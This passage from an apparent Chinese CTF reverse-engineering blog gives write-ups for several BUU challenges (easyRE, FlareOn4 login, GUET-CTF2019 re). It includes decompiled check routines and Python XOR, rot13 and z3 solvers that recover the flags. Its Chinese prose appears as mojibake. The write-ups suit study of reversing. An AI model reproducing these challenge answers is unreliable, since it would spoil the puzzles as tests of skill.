<span class="number">122</span>:</span><br><span class="line">                a = (i-<span class="number">0x4f</span>) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(a) == local[k]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x08-2019çº¢å¸½æ¯-easyRE"><a href="#0x08-2019çº¢å¸½æ¯-easyRE" class="headerlink" title="0x08.[2019çº¢å¸½æ¯]easyRE"></a>0x08.[2019çº¢å¸½æ¯]easyRE</h1><p>è®²çœŸæˆ‘è¿˜æ˜¯å¤ªæ‹‰äº†ï¼Œè¿™é¢˜æŠŠwpçœ‹äº†åŠå¤©ï¼Œä»£ç ä¹Ÿçœ‹äº†åŠå¤©ã€‚ã€‚ã€‚å…ˆçœ‹é¢˜å§ï¼š</p><p>åˆšè¿›å»ä»£ç å®Œå…¨çœ‹ä¸æ‡‚ï¼Œç„¶ååº”è¯¥æ˜¯è¦è¾“å…¥äº›ä»€ä¹ˆä¸œè¥¿ï¼Œ</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211025193922062.png" alt="image-20211025193922062"></p><p>è¿™é‡Œæ˜¯å°†è¾“å…¥çš„ä¸œè¥¿å¼‚æˆ–åä¸æœ¬åœ°çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œè§£ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">local_str = [<span class="number">73</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">62</span>, <span class="number">81</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">40</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">121</span>, <span class="number">46</span>, <span class="number">105</span>, <span class="number">127</span>, <span class="number">100</span>, <span class="number">96</span>, <span class="number">51</span>, <span class="number">119</span>, <span class="number">125</span>,</span><br><span class="line">             <span class="number">119</span>, <span class="number">101</span>, <span class="number">107</span>, <span class="number">57</span>, <span class="number">123</span>, <span class="number">105</span>, <span class="number">121</span>, <span class="number">61</span>, <span class="number">126</span>, <span class="number">121</span>, <span class="number">76</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">67</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(local_str)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> j ^ i == local_str[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#output: Info:The first four chars are `flag`</span></span><br></pre></td></tr></table></figure><p>ä¹‹åæ˜¯åˆä¸€æ¬¡çš„è¾“å…¥ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211025195507127.png" alt="image-20211025195507127"></p><p>ä¼šbase64è¿›è¡Œ10æ¬¡åå’Œæœ¬åœ°çš„å¦ä¸€ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œè§£å¯†10æ¬¡åå‘ç°è¿™æ˜¯ä¸ªå‡çš„hintâ€¦â€¦..</p><p>æ¥ä¸‹æ¥çš„ä¸€ç‚¹æ˜¯æˆ‘æ€ä¹ˆéƒ½æ²¡æƒ³åˆ°çš„ï¼Œï¼Œåœ¨å­—ç¬¦ä¸²çš„ä¸‹é¢æœ‰ä¸ªå¸¸é‡ï¼Œåœ¨å¦ä¸€ä¸ªå‡½æ•°æœ‰è°ƒç”¨ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211025200621618.png" alt="image-20211025200621618"></p><p>xæŸ¥çœ‹äº¤å‰å¼•ç”¨ï¼Œå…³é”®ä»£ç ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211026141034428.png" alt="image-20211026141034428"></p><p>è¾“å…¥çš„ç¬¬ä¸€ä½å’Œç¬¬å››ä½å’Œæœ¬åœ°çš„å­—ç¬¦ä¸²å¼‚æˆ–ä¹‹åè¦åˆ†åˆ«ä¸ºfå’Œgï¼ŒçŒœæµ‹å‰4ä½ä¸ºflagï¼Œåé¢çš„æ˜¯å¾ªç¯å¼‚æˆ–</p><p>shift+eæå–æ•°æ®ï¼Œexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x35</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x62</span>, <span class="number">0x3C</span>, <span class="number">0x27</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x3C</span>, <span class="number">0x32</span>, <span class="number">0x45</span>, <span class="number">0x5B</span></span><br><span class="line">]</span><br><span class="line">flag = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">qq = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    qq.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) ^ <span class="built_in">str</span>[i]))</span><br><span class="line"><span class="built_in">print</span>(qq)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    a = <span class="built_in">chr</span>(<span class="built_in">str</span>[i] ^ <span class="built_in">ord</span>(qq[i % <span class="number">4</span>]))</span><br><span class="line">    <span class="built_in">print</span>(a, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="0x09-FlareOn4-login"><a href="#0x09-FlareOn4-login" class="headerlink" title="0x09.[FlareOn4]login"></a>0x09.[FlareOn4]login</h1><p>å…³é”®çš„éƒ¨åˆ†å°±åªæœ‰12è¡Œçš„é‚£éƒ¨åˆ†ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Html</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>FLARE On 2017<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Enter the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;prompt&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click to check the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);&#125;);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Correct flag!&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯rot13ï¼Œåœ¨ifå‰é¢æŠŠrotflagç»™è¾“å‡ºä¸€ä¸‹å°±OKã€‚</p><h1 id="0x0A-GUET-CTF2019-re"><a href="#0x0A-GUET-CTF2019-re" class="headerlink" title="0x0A.[GUET-CTF2019]re"></a>0x0A.[GUET-CTF2019]re</h1><blockquote><p>  è€ƒç‚¹æ˜¯z3çº¦æŸå™¨ç›¸å…³ï¼š</p><p>  <a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p></blockquote><p>exeinfopeæŸ¥å£³ä¹‹åå‘ç°æ˜¯upxå£³ï¼Œè„±æ‰ä¹‹åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">mian</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er9</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *&amp;v11[<span class="number">8</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;v11[<span class="number">16</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;v11[<span class="number">24</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input your flag:&quot;</span>, a2, a3, a4, a5, a6);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v11, v6, v7, v8, v9, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check(v11) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v12 )</span><br><span class="line">    sub_443550();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€å…³é”®çš„å°±æ˜¯checké‚£ä¸ªäº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">check</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">1629056</span> * *a1 != <span class="number">166163712</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6771600</span> * a1[<span class="number">1</span>] != <span class="number">731332800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3682944</span> * a1[<span class="number">2</span>] != <span class="number">357245568</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10431000</span> * a1[<span class="number">3</span>] != <span class="number">1074393000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3977328</span> * a1[<span class="number">4</span>] != <span class="number">489211344</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5138336</span> * a1[<span class="number">5</span>] != <span class="number">518971936</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7532250</span> * a1[<span class="number">7</span>] != <span class="number">406741500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5551632</span> * a1[<span class="number">8</span>] != <span class="number">294236496</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3409728</span> * a1[<span class="number">9</span>] != <span class="number">177305856</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13013670</span> * a1[<span class="number">10</span>] != <span class="number">650683500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6088797</span> * a1[<span class="number">11</span>] != <span class="number">298351053</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7884663</span> * a1[<span class="number">12</span>] != <span class="number">386348487</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8944053</span> * a1[<span class="number">13</span>] != <span class="number">438258597</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5198490</span> * a1[<span class="number">14</span>] != <span class="number">249527520</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4544518</span> * a1[<span class="number">15</span>] != <span class="number">445362764</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3645600</span> * a1[<span class="number">17</span>] != <span class="number">174988800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10115280</span> * a1[<span class="number">16</span>] != <span class="number">981182160</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9667504</span> * a1[<span class="number">18</span>] != <span class="number">493042704</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5364450</span> * a1[<span class="number">19</span>] != <span class="number">257493600</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13464540</span> * a1[<span class="number">20</span>] != <span class="number">767478780</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5488432</span> * a1[<span class="number">21</span>] != <span class="number">312840624</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">14479500</span> * a1[<span class="number">22</span>] != <span class="number">1404511500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6451830</span> * a1[<span class="number">23</span>] != <span class="number">316139670</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6252576</span> * a1[<span class="number">24</span>] != <span class="number">619005024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7763364</span> * a1[<span class="number">25</span>] != <span class="number">372641472</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7327320</span> * a1[<span class="number">26</span>] != <span class="number">373693320</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8741520</span> * a1[<span class="number">27</span>] != <span class="number">498266640</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8871876</span> * a1[<span class="number">28</span>] != <span class="number">452465676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4086720</span> * a1[<span class="number">29</span>] != <span class="number">208422720</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‰‹åŠ¨ä¸€ä¸ªä¸€ä¸ªè§£ï¼Œä¹Ÿå¯z3ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a1 = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    a1[i] = Int(<span class="string">&#x27;a1[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">1629056</span> * a1[<span class="number">0</span>] == <span class="number">166163712</span>)</span><br><span class="line">s.add(<span class="number">6771600</span> * a1[<span class="number">1</span>] == <span class="number">731332800</span>)</span><br><span class="line">s.add(<span class="number">3682944</span> * a1[<span class="number">2</span>] == <span class="number">357245568</span>)</span><br><span class="line">s.add(<span class="number">10431000</span> * a1[<span class="number">3</span>] == <span class="number">1074393000</span>)</span><br><span class="line">s.add(<span class="number">3977328</span> * a1[<span class="number">4</span>] == <span class="number">489211344</span>)</span><br><span class="line">s.add(<span class="number">5138336</span> * a1[<span class="number">5</span>] == <span class="number">518971936</span>)</span><br><span class="line">s.add(<span class="number">7532250</span> * a1[<span class="number">7</span>] == <span class="number">406741500</span>)</span><br><span class="line">s.add(<span class="number">5551632</span> * a1[<span class="number">8</span>] == <span class="number">294236496</span>)</span><br><span class="line">s.add(<span class="number">3409728</span> * a1[<span class="number">9</span>] == <span class="number">177305856</span>)</span><br><span class="line">s.add(<span class="number">13013670</span> * a1[<span class="number">10</span>] == <span class="number">650683500</span>)</span><br><span class="line">s.add(<span class="number">6088797</span> * a1[<span class="number">11</span>] == <span class="number">298351053</span>)</span><br><span class="line">s.add(<span class="number">7884663</span> * a1[<span class="number">12</span>] == <span class="number">386348487</span>)</span><br><span class="line">s.add(<span class="number">8944053</span> * a1[<span class="number">13</span>] == <span class="number">438258597</span>)</span><br><span class="line">s.add(<span class="number">5198490</span> * a1[<span class="number">14</span>] == <span class="number">249527520</span>)</span><br><span class="line">s.add(<span class="number">4544518</span> * a1[<span class="number">15</span>] == <span class="number">445362764</span>)</span><br><span class="line">s.add(<span class="number">3645600</span> * a1[<span class="number">17</span>] == <span class="number">174988800</span>)</span><br><span class="line">s.add(<span class="number">10115280</span> * a1[<span class="number">16</span>] == <span class="number">981182160</span>)</span><br><span class="line">s.add(<span class="number">9667504</span> * a1[<span class="number">18</span>] == <span class="number">493042704</span>)</span><br><span class="line">s.add(<span class="number">5364450</span> * a1[<span class="number">19</span>] == <span class="number">257493600</span>)</span><br><span class="line">s.add(<span class="number">13464540</span> * a1[<span class="number">20</span>] == <span class="number">767478780</span>)</span><br><span class="line">s.add(<span class="number">5488432</span> * a1[<span class="number">21</span>] == <span class="number">312840624</span>)</span><br><span class="line">s.add(<span class="number">14479500</span> * a1[<span class="number">22</span>] == <span class="number">1404511500</span>)</span><br><span class="line">s.add(<span class="number">6451830</span> * a1[<span class="number">23</span>] == <span class="number">316139670</span>)</span><br><span class="line">s.add(<span class="number">6252576</span> * a1[<span class="number">24</span>] == <span class="number">619005024</span>)</span><br><span class="line">s.add(<span class="number">7763364</span> * a1[<span class="number">25</span>] == <span class="number">372641472</span>)</span><br><span class="line">s.add(<span class="number">7327320</span> * a1[<span class="number">26</span>] == <span class="number">373693320</span>)</span><br><span class="line">s.add(<span class="number">8741520</span> * a1[<span class="number">27</span>] == <span class="number">498266640</span>)</span><br><span class="line">s.add(<span class="number">8871876</span> * a1[<span class="number">28</span>] == <span class="number">452465676</span>)</span><br><span class="line">s.add(<span class="number">4086720</span> * a1[<span class="number">29</span>] == <span class="number">208422720</span>)</span><br><span class="line">s.add(<span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span>)</span><br><span class="line">s.add(<span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[a1[31] = 125,</span><br><span class="line"> a1[30] = 55,</span><br><span class="line"> a1[29] = 51,</span><br><span class="line"> a1[28] = 51,</span><br><span class="line"> a1[27] = 57,</span><br><span class="line"> a1[26] = 51,</span><br><span class="line"> a1[25] = 48,</span><br><span class="line"> a1[24] = 99,</span><br><span class="line"> a1[23] = 49,</span><br><span class="line"> a1[22] = 97,</span><br><span class="line"> a1[21] = 57,</span><br><span class="line"> a1[20] = 57,</span><br><span class="line"> a1[19] = 48,</span><br><span class="line"> a1[18] = 51,</span><br><span class="line"> a1[16] = 97,</span><br><span class="line"> a1[17] = 48,</span><br><span class="line"> a1[15] = 98,</span><br><span class="line"> a1[14] = 48,</span><br><span class="line"> a1[13] = 49,</span><br><span class="line"> a1[12] = 49,</span><br><span class="line"> a1[11] = 49,</span><br><span class="line"> a1[10] = 50,</span><br><span class="line"> a1[9] = 52,</span><br><span class="line"> a1[8] = 53,</span><br><span class="line"> a1[7] = 54,</span><br><span class="line"> a1[5] = 101,</span><br><span class="line"> a1[4] = 123,</span><br><span class="line"> a1[3] = 103,</span><br><span class="line"> a1[2] = 97,</span><br><span class="line"> a1[1] = 108,</span><br><span class="line"> a1[0] = 102]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 